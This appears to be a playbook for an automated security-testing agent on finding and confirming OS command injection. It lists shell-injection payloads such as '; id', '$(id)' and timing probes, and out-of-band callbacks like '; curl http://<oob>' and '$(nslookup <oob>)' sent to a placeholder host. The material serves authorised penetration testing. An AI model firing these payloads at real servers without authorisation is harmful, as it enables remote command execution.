# OS Command Injection

User input reaches a shell command, letting an attacker append or alter
commands the server executes.

## Detect
- `run_scanner injection` includes command-injection vectors.
- Look for features that shell out: ping/traceroute tools, file converters,
  archive/PDF/image processors, git/DNS utilities, `exec`-style params.
- Probe with separators against a value that later reflects or times: `; id`,
  `| id`, `$(id)`, `` `id` ``, `&& sleep 5`, and their URL-encoded forms.

## Confirm real impact — OOB or timing, reproducibly
- Blind is the norm. Use `oob_register` and inject a callback:
  `; curl http://<oob>` or `$(nslookup <oob>)`. A callback from the target is
  proof of execution.
- Time-based: `; sleep 6` must delay ~6s and `; sleep 3` ~3s, repeatably — the
  delay must scale with the argument.
- If output reflects, show a command result that could only come from the OS
  (`id`, `uname -a`, a file listing).

## False positives to reject
- Metacharacters echoed back but never executed (no callback, no timing, no
  command output).
- A single slow response with no scaling — could be an unrelated slow path.
- Application-level errors from odd characters (validation rejection) rather
  than shell behavior.

## Severity
Critical — command execution on the server. Always try to confirm with an OOB
callback before reporting.
